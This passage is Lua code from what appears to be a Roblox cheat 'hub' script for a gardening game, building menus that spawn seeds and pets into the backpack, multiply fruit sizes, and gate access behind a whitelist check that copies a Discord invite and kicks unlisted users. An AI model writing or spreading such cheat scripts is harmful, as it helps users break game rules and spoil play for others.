    local UICorner12 = Instance.new("UICorner")

    UICorner12.CornerRadius = UDim.new(0, 10)
    UICorner12.Parent = TextButton5;
    (function()
        local Gardens = workspace.Gardens

        if Gardens then
            Gardens = workspace.Gardens["Plot" .. t2[10]]
        end

        if not Gardens then
            local TextLabel4 = Instance.new("TextLabel")

            TextLabel4.Size = UDim2.new(1, -32, 0, 40)
            TextLabel4.Position = UDim2.new(0, 16, 0, 10)
            TextLabel4.BackgroundTransparency = 1
            TextLabel4.Text = "No plants found."
            TextLabel4.TextColor3 = Color3.fromRGB(150, 150, 150)
            TextLabel4.TextSize = 14
            TextLabel4.Font = Enum.Font.SourceSans
            TextLabel4.Parent = t2[59]

            return
        end

        local ScrollingFrame = Instance.new("ScrollingFrame")

        ScrollingFrame.Size = UDim2.new(1, -10, 1, -10)
        ScrollingFrame.Position = UDim2.new(0, 5, 0, 5)
        ScrollingFrame.BackgroundTransparency = 1
        ScrollingFrame.BorderSizePixel = 0
        ScrollingFrame.ScrollBarThickness = 4
        ScrollingFrame.ScrollBarImageColor3 = t2[6].Accent
        ScrollingFrame.Parent = t2[59]

        local UIListLayout = Instance.new("UIListLayout")

        UIListLayout.Padding = UDim.new(0, 8)
        UIListLayout.Parent = ScrollingFrame

        local UIPadding4 = Instance.new("UIPadding")

        UIPadding4.PaddingTop = UDim.new(0, 8)
        UIPadding4.PaddingBottom = UDim.new(0, 8)
        UIPadding4.PaddingLeft = UDim.new(0, 8)
        UIPadding4.PaddingRight = UDim.new(0, 8)
        UIPadding4.Parent = ScrollingFrame

        local t8 = {}
        local t9 = {}
        local n3 = 0

        for _, child in pairs(Gardens.Plants:GetChildren()) do
            local v324 = t2[12](child)

            if v324 then
                if not t8[v324] then
                    t8[v324] = true
                    t9[v324] = {}
                    n3 += 1

                    local TextButton6 = Instance.new("TextButton")

                    TextButton6.Size = UDim2.new(1, -10, 0, 35)
                    TextButton6.BackgroundColor3 = t2[6].Secondary
                    TextButton6.Text = v324
                    TextButton6.Font = Enum.Font.GothamBold
                    TextButton6.TextSize = 16
                    TextButton6.TextColor3 = Color3.new(1, 1, 1)
                    TextButton6.BorderSizePixel = 0
                    TextButton6.Parent = ScrollingFrame

                    local UICorner13 = Instance.new("UICorner")

                    UICorner13.CornerRadius = UDim.new(0, 10)
                    UICorner13.Parent = TextButton6

                    local UIStroke = Instance.new("UIStroke")

                    UIStroke.Color = t2[6].Stroke
                    UIStroke.Thickness = 1.2
                    UIStroke.Parent = TextButton6

                    local UIGradient = Instance.new("UIGradient")

                    UIGradient.Color = ColorSequence.new({
                        ColorSequenceKeypoint.new(0, Color3.fromRGB(85, 85, 110)),
                        ColorSequenceKeypoint.new(1, Color3.fromRGB(55, 55, 75))
                    })
                    UIGradient.Rotation = 90
                    UIGradient.Parent = TextButton6
                    TextButton6.MouseEnter:Connect(function()
                        t2[5]:Create(TextButton6, TweenInfo.new(0.15), {
                            BackgroundColor3 = t2[6].Accent
                        }):Play()
                    end)
                    TextButton6.MouseLeave:Connect(function()
                        t2[5]:Create(TextButton6, TweenInfo.new(0.15), {
                            BackgroundColor3 = t2[6].Secondary
                        }):Play()
                    end)
                    TextButton6.MouseButton1Down:Connect(function()
                        t2[5]:Create(TextButton6, TweenInfo.new(0.08), {
                            Size = UDim2.new(1, -14, 0, 32)
                        }):Play()
                    end)
                    TextButton6.MouseButton1Up:Connect(function()
                        t2[5]:Create(TextButton6, TweenInfo.new(0.08), {
                            Size = UDim2.new(1, -10, 0, 35)
                        }):Play()
                    end)
                    TextButton6.MouseButton1Click:Connect(function()
                        for _, v in pairs(t9[v324]) do
                            t2[13](v)
                        end

                        local v485 = t2[7]
                        local v486 = t2[7][v324]

                        v485[v324] = (v486 or 1) * 5

                        for _, child2 in pairs(t2[9].Backpack:GetChildren()) do
                            if child2:IsA("Tool") then
                                t2[15](child2)
                            end
                        end

                        t2[39](v324 .. " fruits scaled ×5!")
                    end)
                end

                table.insert(t9[v324], child)
            end
        end

        ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, n3 * 43)
    end)();
    (function()
        local PottedPlantVisuals = workspace:FindFirstChild("PottedPlantVisuals")

        if not PottedPlantVisuals then
            return
        end

        local GetChildren = PottedPlantVisuals.GetChildren

        for _, v in pairs(GetChildren(PottedPlantVisuals)) do
            t2[16](v)
        end

        PottedPlantVisuals.ChildAdded:Connect(t2[16])
    end)()
    t2[9].Backpack.ChildAdded:Connect(function(child)
        if child:IsA("Tool") then
            t2[15](child)
        end
    end)

    for _, child in pairs(t2[9].Backpack:GetChildren()) do
        t1[1] = child:IsA("Tool")

        if t1[1] then
            t2[15](child)
        end
    end
    local function v44()
        local g336
        if t2[64] then
            t2[64].Visible = false
            t2[64] = nil
        end
        local Text = t2[60].Text
        if Text == "" then
            return
        end
        local v331
        local v332, v333, v334 = pairs(t2[17])
        repeat
            local v335

            v334, v335 = v332(v333, v334)

            if not v334 then
                g336 = true
            end

            if g336 then
                break
            end

            local lower = v334.lower
            local lower2 = Text.lower
        until lower(v334) == lower2(Text)
        if not g336 then
            v331 = v334
        end
        if not v331 then
            for k, _ in pairs(t2[17]) do
                local v341 = k
                local lower = Text.lower

                if v341:lower():find(lower(Text), 1, true) then
                    v331 = v341

                    break
                end
            end
        end
        if v331 then
            local v343 = t2[62]

            if v343 == "Normal" then
                v343 = ""
            end

            local v344 = t2[46](v331, t2[61], v343)

            if v344 then
                t2[39](v344.Name .. " added to Backpack!")

                return
            end
        else
            t2[39]("Pet profile not found inside game data.")
        end
    end
    t2[66] = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("SeedData"))
    t2[67] = ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("SeedData"):WaitForChild("SeedImages")
    t2[68] = t2[23]:WaitForChild("Seeds")

    local function v45()
        local Text = t2[65].Text
        if Text == "" then
            return
        end
        if not t2[41](Text) then
            return
        end
        local Backpack = t2[9]:FindFirstChild("Backpack")
        if not Backpack then
            t2[39](Text .. " added to Backpack!")

            return
        end
        local v353 = Text .. " Seed"
        local v354 = Backpack:FindFirstChild(v353)
        local g362
        local v361
        if not v354 then
            v354 = t2[9].Character

            if v354 then
                v354 = t2[9].Character:FindFirstChild(v353)
            end
        end
        if v354 and v354:IsA("Tool") then
            v354:SetAttribute("Count", (v354:GetAttribute("Count") or 1) + 1)
            t2[33][Text] = v354
            t2[39](Text .. " added to Backpack!")

            return
        end
        local Text2 = t2[68]:FindFirstChild(Text)
        local Tool = Instance.new("Tool")
        Tool.Name = v353
        Tool:SetAttribute("SeedTool", Text)
        Tool:SetAttribute("Count", 1)
        Tool:SetAttribute("MainCategory", "Seed")
        Tool:SetAttribute("ToolDescendants", 0)
        local Text3 = t2[67]:FindFirstChild(Text)
        local v358 = Text3
        if Text3 then
            v358 = Text3:IsA("StringValue")
        end
        Tool.TextureId = not v358 and "" or Text3.Value
        for _, v in ipairs(t2[66]) do
            if Text == v.SeedName then
                v361 = v.YHeight or 0
                g362 = true
            end

            if g362 then
                break
            end
        end
        if not g362 then
            v361 = 0
        end
        g362 = false
        if v361 > 0 then
            Tool.Grip = CFrame.new(0, -v361 * 0.1, 0)
        end
        if Text2 then
            local clone = Text2:Clone()

            clone.Name = "Handle"
            clone.Parent = Tool
        else
            local Part = Instance.new("Part")

            Part.Name = "Handle"
            Part.Size = Vector3.new(0.5, 0.5, 0.5)
            Part.Transparency = 1
            Part.CanCollide = false
            Part.Parent = Tool
        end
        t2[33][Text] = Tool
        Tool.Parent = Backpack
        t2[39](Text .. " added to Backpack!")
    end
    TextButton4.MouseButton1Click:Connect(v44)
    TextButton5.MouseButton1Click:Connect(v45)
    t2[4].InputBegan:Connect(function(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.RightShift then
            if t2[64] then
                t2[64].Visible = false
            end

            t2[53].Visible = not t2[53].Visible

            return
        end

        if input.KeyCode == Enum.KeyCode.M then
            if gameProcessed and t2[4]:GetFocusedTextBox() then
                return
            end

            v44()

            return
        end

        if input.KeyCode == Enum.KeyCode.N then
            if gameProcessed and t2[4]:GetFocusedTextBox() then
                return
            end

            v45()
        end
    end)
    ScreenGui.Parent = t2[9]:WaitForChild("PlayerGui")
end

-- ========================= RUN CHECK ========================= --
local function runCheck()
    -- make sure LocalPlayer is available when running the check
    LocalPlayer = LocalPlayer or Players.LocalPlayer or Players:WaitForChild("LocalPlayer", 10)
    local ui = makeCheckGUI()
    local start = tick()
    local duration = 2.2
    local conn
    conn = RunService.Heartbeat:Connect(function()
        local elapsed = tick() - start
        local progress = math.min(elapsed / duration, 1)
        ui.ProgressFill.Size = UDim2.new(progress, 0, 1, 0)
        local perc = math.floor(progress * 100)
        ui.Percent.Text = perc .. "%"
        if progress >= 1 then
            conn:Disconnect()

            local username = LocalPlayer and LocalPlayer.Name or ""
            local whitelisted = isWhitelisted(username)

            local expiry = getExpiryForUser(username) or 0
            local expired = false
            if expiry and type(expiry) == "number" and expiry > 0 then
                expired = os.time() > expiry
            else
                expired = false
            end

            if expired then
                -- Show "not whitelisted" phrasing, copy discord, then kick
                ui.ScreenGui:Destroy()
                local gui, copyStatus = createDeniedGuiWithStatus("You are not whitelisted.\nRuntime expired on " .. formatUnix(expiry) .. ".")
                -- try auto-copy
                if clipboardCopy(DISCORD_INVITE) then
                    copyStatus.Text = "✔ Discord link copied to clipboard"
                    copyStatus.TextColor3 = Color3.fromRGB(100,220,130)
                else
                    copyStatus.Text = "✖ Unable to copy link automatically"
                    copyStatus.TextColor3 = Color3.fromRGB(220,100,100)
                end
                -- wait a short moment so user sees the message, then kick
                task.delay(KICK_DELAY_SECONDS, function()
                    pcall(function()
                        LocalPlayer:Kick("You are not whitelisted. Join: " .. DISCORD_INVITE)
                    end)
                end)
                return
            end

            if whitelisted then
                ui.Status.Text = "✔ Whitelisted"
                ui.Status.TextColor3 = Color3.fromRGB(100,220,130)
                ui.ProgressFill.BackgroundColor3 = Color3.fromRGB(100,220,130)
                ui.Footer.Text = "Welcome, " .. username .. " — loading hub..."
                task.wait(0.8)
                ui.ScreenGui:Destroy()
                -- call loadHub and surface any errors
                local ok, err = pcall(loadHub)
                if not ok then
                    warn("[NEPXONE-HUB] loadHub failed:", err)
                    -- show a simple error dialog so user sees it in-game
                    local guiErr = Instance.new("ScreenGui")
                    guiErr.Name = "NEPXONE_HubError"
                    guiErr.ResetOnSpawn = false
                    guiErr.Parent = LocalPlayer:FindFirstChild("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
                    local frame = Instance.new("Frame", guiErr)
                    frame.Size = UDim2.new(0, 420, 0, 80)
                    frame.Position = UDim2.new(0.5, -210, 0.4, -40)
                    frame.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
                    local lbl = Instance.new("TextLabel", frame)
                    lbl.Size = UDim2.new(1, -20, 1, -20)
                    lbl.Position = UDim2.new(0, 10, 0, 10)
                    lbl.BackgroundTransparency = 1
                    lbl.TextColor3 = Color3.fromRGB(230, 200, 200)
                    lbl.TextWrapped = true
                    lbl.Text = "NEPXONE-HUB failed to load. See output for details."
                end
            else
                -- not whitelisted (but not expired): show denied but do not auto-kick
                ui.Status.Text = "✖ Not whitelisted"
                ui.Status.TextColor3 = Color3.fromRGB(220,100,100)
                ui.ProgressFill.BackgroundColor3 = Color3.fromRGB(220,100,100)
                ui.Footer.Text = "Access denied — contact the developers for access."
                task.wait(0.9)
                ui.ScreenGui:Destroy()
                local gui, copyStatus = createDeniedGuiWithStatus("You are not whitelisted to use NEPXONE-HUB.\nContact the developers:")
                -- leave user on denied screen (they can copy the discord link manually)
                -- optionally auto-copy as well:
                if clipboardCopy(DISCORD_INVITE) then
                    copyStatus.Text = "✔ Discord link copied to clipboard"
                    copyStatus.TextColor3 = Color3.fromRGB(100,220,130)
                end
            end
        end
    end)
end

-- start the security check (will call loadHub() if allowed)
task.spawn(function()
    task.wait(0.2)
    pcall(runCheck)
end)
